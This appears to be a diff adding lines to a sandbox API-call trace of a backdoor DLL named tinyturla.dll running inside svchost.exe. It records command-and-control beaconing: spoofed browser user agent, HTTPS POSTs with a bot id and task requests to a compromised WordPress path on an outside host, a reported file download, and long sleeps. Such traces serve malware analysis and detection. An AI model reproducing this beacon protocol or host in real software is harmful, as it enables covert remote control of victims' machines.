@@ -2032,4 +2032,211 @@ Destruction de Processus, pid [0x888] (C:\Windows\System32\conhost.exe)
 [EVT] [Max Sleep]
 [MSG] Delay Execution reduced from 600000 ms to 15000 ms 
 
+[ * ] [pid 0x250][tid 0x734] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
 
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000A2E4E09E30
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7ff90bceba91 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0xe4398b90
+[PAR] LPCWSTR       pswzServerName : 0x000000A2E4DF7640
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7ff90bcebb16 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0xe4399ba0
+[PAR] LPCWSTR   pwszVerb          : 0x000000A2E613FB18
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000A2E520E050
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7ff90bcebc26 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000A2E4D9D5A0
+[PAR] LPCWSTR   pwszHeaders      : 0x000000A2E520D790
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7ff90bced38b in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000A2E4D9D5A0
+[PAR] LPCVOID   lpBuffer                 : 0x000000A2E4D7D930
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000A2E613FB70
+[RET] 0x7ff90bced3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000A2E4D9D5A0
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7ff90bced415 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000A2E4D9D5A0
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000A2E4DFD190
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000A2E521CED4
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7ff90bced45c in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0xe4d9d5a0
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000A2E613FB90
+[RET] 0x7ff90bceb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4398b90
+[RET] 0x7ff90bceaeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4d9d5a0
+[RET] 0x7ff90bceaec6 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4399ba0
+[RET] 0x7ff90bceaed5 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000A2E4E0A250
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7ff90bceba91 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0xe4399160
+[PAR] LPCWSTR       pswzServerName : 0x000000A2E4DF7640
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7ff90bcebb16 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0xe4399fc0
+[PAR] LPCWSTR   pwszVerb          : 0x000000A2E613FB38
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000A2E520D330
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7ff90bcebc26 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000A2E4D9D5A0
+[PAR] LPCWSTR   pwszHeaders      : 0x000000A2E520D4F0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0x360
+[RET] 0x7ff90bced38b in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000A2E4D9D5A0
+[PAR] LPCVOID   lpBuffer                 : 0x000000A2E4D8EE00
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "[+] File https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt loaded and saved in Liberty.txt"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x360
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000A2E613FB90
+[RET] 0x7ff90bced3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000A2E4D9D5A0
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7ff90bced415 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000A2E4D9D5A0
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000A2E4DFCEF0
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000A2E521CB54
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7ff90bced45c in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0xe4d9d5a0
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000A2E613FBB0
+[RET] 0x7ff90bceb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4399160
+[RET] 0x7ff90bceaeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4d9d5a0
+[RET] 0x7ff90bceaec6 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0xe4399fc0
+[RET] 0x7ff90bceaed5 in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x927c0 (600 sec)
+[RET] 0x7ff90bce50aa in [tinyturla.dll]
+
+[ * ] [pid 0x250][tid 0x170] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 600000 ms to 15000 ms 
